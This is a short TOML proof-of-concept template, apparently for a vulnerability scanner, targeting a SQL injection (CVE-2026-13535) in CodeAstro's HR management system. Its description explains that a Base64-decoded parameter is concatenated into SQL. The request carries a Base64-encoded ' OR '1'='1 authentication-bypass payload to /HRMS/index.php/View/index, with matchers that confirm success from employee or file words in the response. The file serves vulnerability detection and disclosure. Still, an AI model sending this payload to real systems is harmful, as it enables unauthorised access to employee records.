[info]
id = "POC-AVE-2026-0010"
name = "CodeAstro HRMS View接口SQL注入 PoC"
author = "AVE"
severity = "high"
tags = ["sqli", "cve-2026-13535", "codeastro", "hrms", "cwe-89", "cwe-74"]
description = "CodeAstro Human Resource Management System View接口的I参数经Base64解码后直接拼接至SQL查询语句，未使用参数化查询。攻击者可通过构造恶意Base64编码的SQL payload绕过认证并执行任意SQL指令。"
vuln_id = ["CVE-2026-13535", "AVE-2026-0010"]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/HRMS/index.php/View/index"

query.I = "MScgT1IgJzEnPScx"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["employee", "file", "Employee", "File"]
expect = true
